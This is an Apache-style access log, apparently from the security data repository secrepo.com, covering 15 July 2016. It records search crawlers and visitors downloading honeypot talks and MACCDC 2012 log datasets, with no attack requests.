164.132.161.15 - - [15/Jul/2016:02:52:45 -0700] "GET /self.logs/access.log.2016-04-30.gz HTTP/1.1" 200 7574 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
66.249.84.249 - - [15/Jul/2016:03:16:10 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.84.193 - - [15/Jul/2016:03:16:10 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
164.132.161.95 - - [15/Jul/2016:03:17:33 -0700] "GET /self.logs/access.log.2015-05-20.gz HTTP/1.1" 200 4845 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
51.254.143.240 - - [15/Jul/2016:03:20:16 -0700] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
51.254.143.240 - - [15/Jul/2016:03:20:20 -0700] "GET / HTTP/1.0" 200 33073 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
24.19.206.56 - - [15/Jul/2016:03:23:55 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko)" 
24.19.206.56 - - [15/Jul/2016:03:23:56 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Safari/11601.6.17 CFNetwork/760.5.1 Darwin/15.5.0 (x86_64)" 
24.19.206.56 - - [15/Jul/2016:03:23:56 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/11601.6.17 CFNetwork/760.5.1 Darwin/15.5.0 (x86_64)" 
24.19.206.56 - - [15/Jul/2016:03:23:56 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/11601.6.17 CFNetwork/760.5.1 Darwin/15.5.0 (x86_64)" 
24.19.206.56 - - [15/Jul/2016:03:23:56 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/11601.6.17 CFNetwork/760.5.1 Darwin/15.5.0 (x86_64)" 
24.19.206.56 - - [15/Jul/2016:03:23:56 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/11601.6.17 CFNetwork/760.5.1 Darwin/15.5.0 (x86_64)" 
92.222.153.162 - - [15/Jul/2016:03:27:21 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.0" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
51.255.65.78 - - [15/Jul/2016:03:29:04 -0700] "GET /self.logs/access.log.2015-08-16.gz HTTP/1.1" 200 6479 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
178.251.201.37 - - [15/Jul/2016:03:29:31 -0700] "GET / HTTP/1.1" 200 9904 "http://www.mlsecproject.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
178.251.201.37 - - [15/Jul/2016:03:29:32 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
178.251.201.37 - - [15/Jul/2016:03:29:32 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
178.251.201.37 - - [15/Jul/2016:03:29:32 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
54.161.149.81 - - [15/Jul/2016:03:29:44 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Googlebot (gocrawl v0.4)" 
54.161.149.81 - - [15/Jul/2016:03:29:44 -0700] "GET /robots.txt HTTP/1.1" 200 304 "http://secrepo.com/robots.txt" "Go 1.1 package http" 
54.161.149.81 - - [15/Jul/2016:03:29:55 -0700] "GET / HTTP/1.1" 200 9848 "-" "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2" 
54.161.149.81 - - [15/Jul/2016:03:30:07 -0700] "GET /data HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2" 
172.99.70.132 - - [15/Jul/2016:03:30:30 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
172.99.70.132 - - [15/Jul/2016:03:30:30 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Tornado-Async-Client" 
172.99.70.132 - - [15/Jul/2016:03:30:30 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
172.99.70.132 - - [15/Jul/2016:03:30:30 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
54.161.149.81 - - [15/Jul/2016:03:30:25 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 524004923 "-" "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2" 
117.190.191.170 - - [15/Jul/2016:03:38:04 -0700] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.133 - - [15/Jul/2016:03:46:35 -0700] "GET /self.logs/error.log.2016-02-10.gz HTTP/1.1" 200 739 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.213 - - [15/Jul/2016:04:07:55 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
51.255.65.41 - - [15/Jul/2016:04:22:19 -0700] "GET /self.logs/error.log.2016-03-02.gz HTTP/1.1" 200 705 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
111.7.128.40 - - [15/Jul/2016:04:25:14 -0700] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
164.132.161.39 - - [15/Jul/2016:05:04:34 -0700] "GET /self.logs/error.log.2015-09-30.gz HTTP/1.1" 200 689 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
93.147.226.235 - - [15/Jul/2016:05:07:08 -0700] "GET / HTTP/1.1" 200 9904 "http://www.mlsecproject.org/" "Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1" 
93.147.226.235 - - [15/Jul/2016:05:07:08 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1" 
93.147.226.235 - - [15/Jul/2016:05:07:08 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1" 
183.19.21.208 - - [15/Jul/2016:05:14:44 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
183.19.21.208 - - [15/Jul/2016:05:13:55 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 473760 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
46.242.123.167 - - [15/Jul/2016:05:17:45 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930799 "http://yandex.ru/clck/jsredir?from=yandex.ru%3Bsearch%3Bweb%3B%3B&text=&etext=1117.zOGC1Gfc3UJfLbQZ0zG6avvQIRvLQ05fgIwVCesJ94oNSmk6TzpVdELEZBiY7Uem.7bde76c8cf4eb796df65c49dad2d26dea9755f87&uuid=&state=_BLhILn4SxNIvvL0W45KSic66uCIg23qh8iRG98qeIXmeppkgUc0YMIVJNtoWDTa6Ctl47TPu5I&data=UlNrNmk5WktYejR0eWJFYk1LdmtxdFVvX2JPZzkyaEU2WFNsdVNGUmVZbHU3ZjQwYnJsWFQzaTk3eklSTnotZ1h4SW1DUmpSY1JVWlAxT212aTdGbmljek9uMzIxTElNRnUyZGR2aTVBa0t2NzJmRlhUT0VmbE5TN2hOTUwwcnVTVXdfd3lLVzlzaDY4Y2liczNLQ01Kb0RIMHlYencyQQ&b64e=2&sign=e04bf08987ffe6063bc753377f025f61&keyno=0&cst=AiuY0DBWFJ7IXge4WdYJQYP93Xfrtkbaa7OUzPj4OBRSQvo43hWcrPulRUAenrwoWVjUtwWPaNIiRbM2Tgj9QSkwBkTRS7y86RHIaQCOhvO34ceP6gfcAFZaFGxaG-k14ILQYX867QzKc7rnJxX-jcqTePphWICX&ref=orjY4mGPRjk5boDnW0uvlrrd71vZw9kp5uQozpMtKCWAB4NbWhozjq6ZnYtLesjGsWJ95PVvwJgxMmfG-xhhuoa-W41Y2xLKoW8eu0esBK459XuJE_LOug&l10n=ru&cts=1468584249064&mc=2.54576748889" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36" 
79.182.87.109 - - [15/Jul/2016:05:18:05 -0700] "GET / HTTP/1.1" 200 9904 "https://www.google.co.il/" "Mozilla/5.0 (Linux; Android 6.0; LG-H960 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36" 
79.182.87.109 - - [15/Jul/2016:05:18:06 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0; LG-H960 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36" 
79.182.87.109 - - [15/Jul/2016:05:18:06 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0; LG-H960 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36" 
79.182.87.109 - - [15/Jul/2016:05:18:07 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0; LG-H960 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36" 
207.46.13.118 - - [15/Jul/2016:05:18:47 -0700] "GET /self.logs/access.log.2015-04-22.gz HTTP/1.1" 200 14722 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
164.132.161.81 - - [15/Jul/2016:05:25:32 -0700] "GET /self.logs/error.log.2015-07-01.gz HTTP/1.1" 200 989 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
68.180.228.157 - - [15/Jul/2016:05:25:54 -0700] "GET /self.logs/error.log.2015-01-29.gz HTTP/1.1" 200 1441 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
51.255.65.60 - - [15/Jul/2016:05:29:00 -0700] "GET /self.logs/error.log.2015-07-22.gz HTTP/1.1" 200 694 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
157.55.39.133 - - [15/Jul/2016:05:46:02 -0700] "GET /self.logs/access.log.2015-06-07.gz HTTP/1.1" 200 3452 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
123.125.71.117 - - [15/Jul/2016:05:50:16 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
111.206.36.11 - - [15/Jul/2016:05:50:16 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
185.2.196.196 - - [15/Jul/2016:06:05:00 -0700] "GET / HTTP/1.1" 200 33084 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
193.113.37.9 - - [15/Jul/2016:06:05:00 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
193.113.37.9 - - [15/Jul/2016:06:05:01 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
193.113.37.9 - - [15/Jul/2016:06:05:01 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
185.2.196.196 - - [15/Jul/2016:06:05:54 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 89100 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
193.113.37.9 - - [15/Jul/2016:06:05:55 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 4274093 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
185.2.196.196 - - [15/Jul/2016:06:07:09 -0700] "GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1" 200 83700 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
193.113.37.9 - - [15/Jul/2016:06:07:09 -0700] "GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1" 200 9478149 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
176.189.64.172 - - [15/Jul/2016:06:08:32 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
176.189.64.172 - - [15/Jul/2016:06:08:33 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
176.189.64.172 - - [15/Jul/2016:06:08:33 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
176.189.64.172 - - [15/Jul/2016:06:08:34 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
91.200.12.136 - - [15/Jul/2016:06:09:06 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 930799 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Windows NT 6.1; rv:44.0) Gecko/20100101 Firefox/44.0" 
176.189.64.172 - - [15/Jul/2016:06:09:43 -0700] "GET / HTTP/1.1" 301 483 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
157.55.39.213 - - [15/Jul/2016:06:15:50 -0700] "GET /self.logs/access.log.2015-11-17.gz HTTP/1.1" 200 5611 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.213 - - [15/Jul/2016:06:15:50 -0700] "GET /self.logs/access.log.2015-12-29.gz HTTP/1.1" 200 6673 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.213 - - [15/Jul/2016:06:15:51 -0700] "GET /self.logs/error.log.2015-05-11.gz HTTP/1.1" 200 1139 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.213 - - [15/Jul/2016:06:15:51 -0700] "GET /self.logs/error.log.2015-04-13.gz HTTP/1.1" 200 844 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
46.119.112.87 - - [15/Jul/2016:06:21:44 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://domdeco.net/" "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01" 
46.119.112.87 - - [15/Jul/2016:06:21:46 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://domdeco.net/" "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01" 
91.200.12.136 - - [15/Jul/2016:06:23:30 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 677440 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
146.185.28.59 - - [15/Jul/2016:06:28:28 -0700] "GET / HTTP/1.1" 200 9904 "https://www.reddit.com/r/datasets/comments/3tbxap/cyber_security_datasets/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
146.185.28.59 - - [15/Jul/2016:06:28:38 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
146.185.28.59 - - [15/Jul/2016:06:28:42 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
146.185.28.59 - - [15/Jul/2016:06:29:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
185.2.196.196 - - [15/Jul/2016:06:29:24 -0700] "GET /maccdc2012/maccdc2012_full_alert.7z HTTP/1.1" 200 45900 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
193.113.37.9 - - [15/Jul/2016:06:29:24 -0700] "GET /maccdc2012/maccdc2012_full_alert.7z HTTP/1.1" 200 24978942 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
164.132.161.20 - - [15/Jul/2016:06:32:11 -0700] "GET /self.logs/access.log.2015-09-30.gz HTTP/1.1" 200 5030 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ahrefs.com/robot/)" 
144.36.133.38 - - [15/Jul/2016:06:36:26 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; Tablet PC 2.0; managedpc)" 
144.36.133.38 - - [15/Jul/2016:06:36:26 -0700] "GET /browserconfig.xml HTTP/1.1" 404 340 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; Tablet PC 2.0; managedpc)" 
117.190.191.170 - - [15/Jul/2016:06:38:04 -0700] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
139.194.196.12 - - [15/Jul/2016:06:40:24 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 773800 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
1.48.241.235 - - [15/Jul/2016:06:38:01 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
1.48.241.235 - - [15/Jul/2016:06:38:01 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1168860 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
207.46.13.74 - - [15/Jul/2016:06:43:58 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
139.194.196.12 - - [15/Jul/2016:06:40:28 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 69179180 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:40:30 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 68528686 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:40:30 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 68541890 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:40:27 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 62175560 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:40:30 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 68275281 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:48:57 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 6919492 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:49:48 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 2599925 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:49:42 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 3258720 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:40:27 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 69342700 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:40:30 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 65174400 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:50:09 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 952799 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:49:45 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 3092280 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:40:26 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 61731720 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:50:15 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 509115 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:50:14 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 655540 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:50:16 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 379600 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:50:18 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 148086 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:50:16 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 363956 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:50:18 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 131949 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
139.194.196.12 - - [15/Jul/2016:06:50:09 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 206 794240 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
123.125.71.82 - - [15/Jul/2016:07:00:52 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.71.38 - - [15/Jul/2016:07:00:52 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
41.13.28.28 - - [15/Jul/2016:07:18:28 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 304 165 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0" 
